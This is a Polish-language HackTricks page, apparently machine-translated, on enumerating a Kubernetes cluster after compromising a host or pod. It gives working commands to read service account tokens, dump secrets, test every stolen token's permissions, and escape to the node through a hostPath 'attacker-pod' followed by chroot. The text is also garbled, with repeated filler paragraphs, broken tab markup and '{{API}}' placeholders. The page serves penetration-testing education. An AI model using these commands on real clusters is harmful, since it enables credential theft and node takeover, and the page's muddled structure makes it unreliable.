# Wyliczanie Kubernetes

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>
{% endhint %}

## Tokeny Kubernetes

Jeśli uzyskasz skompromitowany dostęp do maszyny, użytkownik może mieć dostęp do platformy Kubernetes. Token zazwyczaj znajduje się w pliku wskazywanym przez **zmienną środowiskową `KUBECONFIG`** lub **wewnątrz `~/.kube`**.

W tym folderze możesz znaleźć pliki konfiguracyjne z **tokenami i konfiguracjami do połączenia z serwerem API**. W tym folderze znajduje się również folder pamięci podręcznej z wcześniej pobranymi informacjami.

Jeśli skompromitowałeś pod w środowisku Kubernetes, istnieją inne miejsca, gdzie możesz znaleźć tokeny i informacje o bieżącym środowisku K8:

### Tokeny Konta Usługi

Zanim przejdziesz dalej, jeśli nie wiesz, co to jest usługa w Kubernetes, sugeruję **przejście pod ten link i przeczytanie przynajmniej informacji o architekturze Kubernetes**.

Zaczerpnięte z [dokumentacji](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server) Kubernetes:

_„Gdy tworzysz pod, jeśli nie określisz konta usługi, automatycznie przypisane jest mu_ domyślne _konto usługi w tej samej przestrzeni nazw.”_

**Konto usługi** to obiekt zarządzany przez Kubernetes i używany do nadawania tożsamości procesom uruchamianym w podzie.\
Każde konto usługi ma powiązany z nim sekret, a ten sekret zawiera token nosiciela. Jest to token JSON Web Token (JWT), metoda reprezentowania roszczeń bezpiecznie między dwiema stronami.

Zazwyczaj **jeden** z katalogów:

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

zawiera pliki:

* **ca.crt**: To certyfikat ca do sprawdzania komunikacji kubernetes
* **namespace**: Wskazuje bieżącą przestrzeń nazw
* **token**: Zawiera **token usługi** bieżącego poda.

Teraz, gdy masz token, możesz znaleźć serwer API w zmiennej środowiskowej **`KUBECONFIG`**. Aby uzyskać więcej informacji, uruchom `(env | set) | grep -i "kuber|kube`**`"`**

Token konta usługi jest podpisywany przez klucz znajdujący się w pliku **sa.key** i weryfikowany przez **sa.pub**.

Domyślna lokalizacja w **Kubernetes**:

* /etc/kubernetes/pki

Domyślna lokalizacja w **Minikube**:

* /var/lib/localkube/certs

### Gorące Pody

_**Gorące pody**_ to pody zawierające uprzywilejowany token konta usługi. Uprzywilejowany token konta usługi to token, który ma uprawnienia do wykonywania uprzywilejowanych zadań, takich jak wyświetlanie tajemnic, tworzenie podów, itp.

## RBAC

Jeśli nie wiesz, co to jest **RBAC**, **przeczytaj tę sekcję**.

## Szybki Arkusz Wyliczeniowy

Aby wyliczyć środowisko K8s, potrzebujesz kilku rzeczy:

* **Poprawny token autoryzacyjny**. W poprzedniej sekcji zobaczyliśmy, gdzie szukać tokenu użytkownika i tokenu konta usługi.
* **Adres (**_**https://host:port**_**) serwera API Kubernetes**. Zazwyczaj można go znaleźć w zmiennych środowiskowych i/lub w pliku konfiguracyjnym kube.
* **Opcjonalnie**: **ca.crt do weryfikacji serwera API**. Można go znaleźć w tych samych miejscach, gdzie można znaleźć token. Jest to przydatne do weryfikacji certyfikatu serwera API, ale korzystając z `--insecure-skip-tls-verify` z `kubectl` lub `-k` z `curl`, nie będziesz potrzebować tego.

Dzięki tym szczegółom możesz **wyliczyć kubernetes**. Jeśli **API** z jakiegoś powodu jest **dostępne** przez **Internet**, możesz po prostu pobrać te informacje i wyliczyć platformę z twojego hosta.

Jednak zazwyczaj **serwer API znajduje się w sieci wewnętrznej**, dlatego będziesz musiał **utworzyć tunel** przez skompromitowaną maszynę, aby uzyskać do niego dostęp z twojej maszyny, lub możesz **przesłać** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binarny, lub użyć **`curl/wget/cokolwiek`** do wykonywania surowych żądań HTTP do serwera API.

### Różnice między czasownikami `list` a `get`

Z uprawnieniami **`get`** możesz uzyskać dostęp do informacji o określonych zasobach (_opcja `describe` w `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Jeśli masz uprawnienie **`list`**, możesz wykonywać żądania API w celu wylistowania danego typu zasobu (_opcja `_`get`_ w `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Jeśli masz uprawnienie **`watch`**, możesz wykonywać żądania API w celu monitorowania zasobów:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Otwierają połączenie strumieniowe, które zwraca pełny manifest Deployment za każdym razem, gdy się zmienia (lub gdy zostanie utworzony nowy).

{% hint style="danger" %}
Następujące polecenia `kubectl` wskazują tylko, jak wyświetlić obiekty. Jeśli chcesz uzyskać dostęp do danych, musisz użyć `describe` zamiast `get`.
{% endhint %}

### Użycie curl

Z wnętrza poda można użyć kilku zmiennych środowiskowych:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
Domyślnie pod może uzyskać dostęp do serwera **kube-api** pod nazwą domenową **`kubernetes.default.svc`**, a sieć kube można zobaczyć w **`/etc/resolv.config`**, gdzie znajdziesz adres serwera DNS Kubernetesa (".1" z tego samego zakresu to punkt końcowy kube-api).
{% endhint %}

### Używając kubectl

Mając token i adres serwera API, używasz kubectl lub curl do uzyskania do niego dostępu, zgodnie z poniższym:

Domyślnie, APISERVER komunikuje się za pomocą schematu `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> jeśli brak `https://` w adresie URL, możesz otrzymać błąd typu Bad Request.

Możesz znaleźć [**oficjalny arkusz kalkulacyjny kubectl tutaj**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Celem poniższych sekcji jest przedstawienie w uporządkowany sposób różnych opcji do wyliczenia i zrozumienia nowego K8s, do którego uzyskałeś dostęp.

Aby znaleźć żądanie HTTP, które wysyła `kubectl`, możesz użyć parametru `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Aktualna Konfiguracja

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

Jeśli udało ci się ukraść dane uwierzytelniające użytkowników, możesz je **skonfigurować lokalnie** używając czegoś w rodzaju:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Uzyskaj obsługiwane zasoby

Dzięki tym informacjom będziesz znać wszystkie usługi, które możesz wymienić

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
### Uzyskaj bieżące uprawnienia

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}### API

W celu wylistowania wszystkich dostępnych API w klastrze Kubernetes, można użyć polecenia `kubectl get --raw /`. Można również użyć narzędzia `kube-api` do automatycznego wylistowania wszystkich endpointów API. Dzięki temu można uzyskać pełniejszy obraz dostępnych API w klastrze.
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

Inny sposób sprawdzenia swoich uprawnień to użycie narzędzia: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

Możesz dowiedzieć się więcej o **Kubernetes RBAC** w:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**Gdy już wiesz, jakie uprawnienia** posiadasz, sprawdź następującą stronę, aby dowiedzieć się, **czy możesz je nadużyć** w celu eskalacji uprawnień:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Pozyskaj role innych osób

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Pobierz przestrzenie nazw

Kubernetes obsługuje **wiele wirtualnych klastrów** wspieranych przez ten sam fizyczny klaster. Te wirtualne klastry nazywane są **przestrzeniami nazw**.
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

### Wyliczanie zasobów API

Podczas testowania penetracyjnego klastra Kubernetes ważne jest również wyliczenie dostępnych zasobów API. Można to zrobić, wysyłając zapytanie HTTP GET na adres URL klastra Kubernetes, na przykład:

```plaintext
GET /api
GET /apis
GET /apis/{api-group}
```

Można również użyć narzędzi takich jak `kubectl` do wylistowania zasobów API:

```plaintext
kubectl get --raw /
kubectl get --raw /api
kubectl get --raw /apis
kubectl get --raw /apis/{api-group}
```

To pozwala na zidentyfikowanie dostępnych zasobów API, co może być przydatne podczas dalszego etapu testowania penetracyjnego. 

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### Pobierz tajemnice

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}{{API}}{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

Jeśli możesz odczytać tajemnice, możesz użyć poniższych linii, aby uzyskać uprawnienia związane z każdym tokenem:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Pobierz konta usług

Jak omówiono na początku tej strony, **gdy uruchamiany jest pod, zazwyczaj przypisywane jest do niego konto usługi**. Dlatego też, wylistowanie kont usług, ich uprawnień i miejsca uruchomienia może umożliwić użytkownikowi eskalację uprawnień.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}### API

API (Interfejs Programowania Aplikacji) jest zestawem reguł i definicji, które umożliwiają jednym systemom komunikację z innymi. W kontekście Kubernetes, API może być używane do zarządzania zasobami klastra, takimi jak pody, usługi, replikacje itp. Podczas testowania penetracyjnego, ważne jest zidentyfikowanie i zrozumienie dostępnych punktów końcowych API w celu ewentualnego wykorzystania luk w zabezpieczeniach.
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### Pobierz wdrożenia

Wdrożenia określają **komponenty**, które muszą być **uruchomione**.
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}### API

API (Interfejs Programowania Aplikacji) jest zestawem reguł i definicji, które umożliwiają jednym systemom komunikację z innymi. W kontekście Kubernetes, API może być używane do zarządzania zasobami klastra, takimi jak pody, usługi, replikacje itp. Podczas testowania penetracyjnego, ważne jest zidentyfikowanie i zrozumienie dostępnych punktów końcowych API w celu ewentualnego wykorzystania luk w zabezpieczeniach.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Pobierz Pojemniki

Pojemniki to rzeczywiste **kontenery**, które zostaną **uruchomione**.
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}### API

API (Interfejs Programowania Aplikacji) to zestaw reguł i protokołów, które umożliwiają aplikacjom komunikację między sobą. W kontekście Kubernetes, API może być używane do zarządzania zasobami klastra, takimi jak pody, usługi, replikacje itp. Podczas testowania penetracyjnego, ważne jest zidentyfikowanie i zrozumienie dostępnych punktów końcowych API w celu ewentualnego wykorzystania luk w zabezpieczeniach.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Pobierz usługi

Usługi Kubernetes służą do **udostępniania usługi na określonym porcie i adresie IP** (które będą działać jako równoważnik obciążenia dla modułów, które faktycznie oferują usługę). Jest to interesujące, aby wiedzieć, gdzie można znaleźć inne usługi do próby ataku.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}Wyszukiwanie enumeracyjne API Kubernetes może ujawnić informacje o zasobach klastra, takie jak usługi, końcówki, przestrzenie nazw, role, rolebindingi itp. Można to zrobić, wysyłając zapytania do interfejsu API Kubernetes, aby uzyskać informacje o dostępnych zasobach i konfiguracjach. Jest to przydatne podczas oceny bezpieczeństwa klastra Kubernetes i identyfikacji ewentualnych luk w zabezpieczeniach. {% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### Pobierz węzły

Pobierz wszystkie **węzły skonfigurowane w klastrze**.

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}### API

API (Interfejs Programowania Aplikacji) to zestaw reguł i protokołów, które umożliwiają aplikacjom komunikację między sobą. W kontekście Kubernetes, API może być używane do zarządzania zasobami klastra, takimi jak pody, usługi, replikacje itp. Podczas testowania penetracyjnego, ważne jest zidentyfikowanie i zrozumienie dostępnych punktów końcowych API w celu ewentualnego wykorzystania luk w zabezpieczeniach.
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
### Pobierz DaemonSets

**DaemonSets** pozwalają upewnić się, że **określony pod działa na wszystkich węzłach** klastra (lub na wybranych). Jeśli usuniesz DaemonSet, zarządzane przez niego pody również zostaną usunięte.
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}### API

W celu wylistowania wszystkich dostępnych API w klastrze Kubernetes, można użyć polecenia `kubectl get --raw /`. Można również użyć narzędzia `kube-api` do automatycznego wylistowania wszystkich endpointów API. Dzięki temu można uzyskać pełniejszy obraz dostępnych funkcji i zasobów w klastrze.
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Pobierz zadanie cron

Zadania cron pozwalają zaplanować uruchomienie poda, który wykona jakieś działanie.
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}Wyszukiwanie enumeracyjne API Kubernetes może ujawnić informacje o zasobach klastra, takie jak usługi, składowiska, przestrzenie nazw i wiele innych. Można to zrobić, wysyłając zapytania do interfejsu API Kubernetes, aby uzyskać listę dostępnych zasobów i ich konfiguracji. Jest to ważny krok podczas testowania penetracyjnego klastra Kubernetes, aby zidentyfikować potencjalne luki w zabezpieczeniach. {% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Pobierz configMap

configMap zawsze zawiera wiele informacji i plików konfiguracyjnych, które są dostarczane do aplikacji uruchamianych w klastrze Kubernetes. Zazwyczaj można znaleźć wiele haseł, sekretów, tokenów, które są używane do łączenia się i uwierzytelniania w innych usługach wewnętrznych/zewnętrznych.
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}{{Wyliczenie}}

Wyliczenie zasobów API w klastrze Kubernetes może być przeprowadzone za pomocą narzędzi do skanowania sieci, takich jak Nmap lub przy użyciu narzędzi do testowania penetracyjnego, takich jak kube-hunter. Można również ręcznie przeglądać dostępne zasoby, takie jak serwisy, końcówki API i kontrolery, aby zidentyfikować potencjalne punkty wejścia dla ataków. Upewnij się, że wszystkie zasoby API są odpowiednio zabezpieczone i mają ograniczone uprawnienia dostępu.
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### Pobierz "wszystko"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **Pobierz zużycie zasobów przez pody**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Ucieczka z pojemnika

Jeśli jesteś w stanie tworzyć nowe pojemniki, możesz próbować uciec z nich do węzła. Aby to zrobić, musisz utworzyć nowy pojemnik za pomocą pliku yaml, przełączyć się na utworzony pojemnik, a następnie użyć chroot do wejścia do systemu węzła. Możesz użyć już istniejących pojemników jako odniesienia do pliku yaml, ponieważ wyświetlają istniejące obrazy i ścieżki.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Jeśli musisz utworzyć pod na określonym węźle, możesz użyć poniższej komendy, aby uzyskać etykiety na węźle
>
> `k get nodes --show-labels`
>
> Zazwyczaj kubernetes.io/hostname i node-role.kubernetes.io/master to dobre etykiety do wyboru.
>
> [reference]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[oryginalne źródło yaml](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

Po tym utwórz pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Teraz możesz przełączyć się do utworzonej kapsuły w następujący sposób
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
I na koniec chrootujesz się do systemu węzła
```bash
chroot /root /bin/bash
```
Informacje uzyskane z: [Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Atakowanie i Obronność Kubernetes: Bust-A-Kube – Odcinek 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Referencje

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
Naucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępniaj sztuczki hackingu, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
